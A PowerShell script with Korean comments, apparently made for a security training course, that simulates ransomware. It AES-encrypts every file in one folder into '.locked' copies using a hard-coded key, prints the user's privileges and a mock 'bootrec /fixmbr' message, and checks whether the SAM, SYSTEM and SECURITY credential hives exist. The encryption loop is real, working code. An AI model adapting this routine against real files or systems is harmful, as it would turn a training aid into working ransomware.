# ================================================================
# 훈련용 랜섬웨어 시뮬레이션 스크립트
# 26AI_장상훈
# ================================================================

# 암호화 기능을 사용하기 위해 .NET System.Security 어셈블리 로드
Add-Type -AssemblyName System.Security  

# ================================================================
# 1. AES-256 키와 IV 설정
# ================================================================

# AES-256을 위해 Key는 32바이트, IV는 16바이트로 정의
$key = 0..31 | ForEach-Object { [byte]$_ }		# 32바이트 Key
$iv  = 0..15 | ForEach-Object { [byte]($_ + 100) }	# 16바이트 IV

# ================================================================
# 2. AES 암호화 함수 정의
# ================================================================

function Encrypt-File($inputFile, $outputFile) {
    # AES 객체 생성 및 설정
    $aes = New-Object System.Security.Cryptography.AesManaged					# AES 객체 생성		
    $aes.KeySize = 256													# AES-256 설정
    $aes.BlockSize = 128													# 블록 크기 128비트
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC					# 암호화 모드 CBC 사용
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7				# 패딩 방식 PKCS7 사용
    $aes.Key = $key													# 위에서 정의한 Key 사용
    $aes.IV = $iv														# 위에서 정의한 IV 사용

    $encryptor = $aes.CreateEncryptor()										# 암호화 변환기 생성
    $fileBytes = [System.IO.File]::ReadAllBytes($inputFile)							# 입력 파일 바이트 읽기
    $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)		# 파일 바이트 암호화

    [System.IO.File]::WriteAllBytes($outputFile, $encryptedBytes)						# 암호화된 파일 저장

    Write-Host "암호화 완료: $([System.IO.Path]::GetFileName($inputFile)) → $([System.IO.Path]::GetFileName($outputFile))"	# 완료 메시지 출력
}

# ================================================================
# 3. 대상 디렉터리 파일 암호화 절차
# ================================================================

$targetDir = "C:\Users\Administrator\Desktop\HFS_Files"  							# 테스트할 폴더 경로

Get-ChildItem -Path $targetDir -File | ForEach-Object {
    if ($_.Extension -ne ".locked") {        					# 이미 암호화된 파일은 제외
        $inputFile = $_.FullName						# 원본 파일 전체 경로
        $outputFile = "$inputFile.locked"					# 암호화 후 파일 경로
        Encrypt-File -inputFile $inputFile -outputFile $outputFile	# 암호화 함수 호출
    }
}

# ================================================================
# 4. 관리자 권한 체크
# ================================================================

$privs = whoami /priv      										# 현재 사용자 권한 확인
Write-Host $privs												# 권한 정보 출력
Write-Host "훈련용: SeTakeOwnershipPrivilege 활성화 시뮬레이션 완료"

# ================================================================
# 5. MBR 손상 시뮬레이션
# ================================================================

function Simulate-FixMBR {
    Write-Host "MBR 손상 명령 시도: bootrec /fixmbr"							# 시뮬레이션 메시지
    Write-Host "경고: 실제 시스템 MBR 변경은 차단되었습니다! (훈련용 시뮬레이션)"
}
Simulate-FixMBR													# 함수 호출

# ================================================================
# 6. 시스템 드라이브 접근 시뮬레이션
# ================================================================

$systemFiles = @(
    "C:\Windows\System32\config\SAM",			# 사용자 계정 정보 파일
    "C:\Windows\System32\config\SYSTEM",		# 시스템 구성 파일
    "C:\Windows\System32\config\SECURITY"		# 보안 정책 파일
)

foreach ($file in $systemFiles) {
    if (Test-Path $file) {											# 파일 존재 여부 확인
        Write-Host "훈련용 접근 시뮬레이션: $file 확인됨"
    } else {
        Write-Host "훈련용 접근 시뮬레이션: $file 존재하지 않음 (테스트 환경)"
    }
}

# ================================================================
# 종료 메시지
# ================================================================

Write-Host "훈련용 랜섬웨어 시뮬레이션이 완료되었습니다."
Write-Host "훈련용 랜섬웨어 파일입니다."
Write-Host "실제 시스템에는 아무런 피해가 없으며, 파일은 안전하게 .locked로 암호화되었습니다."
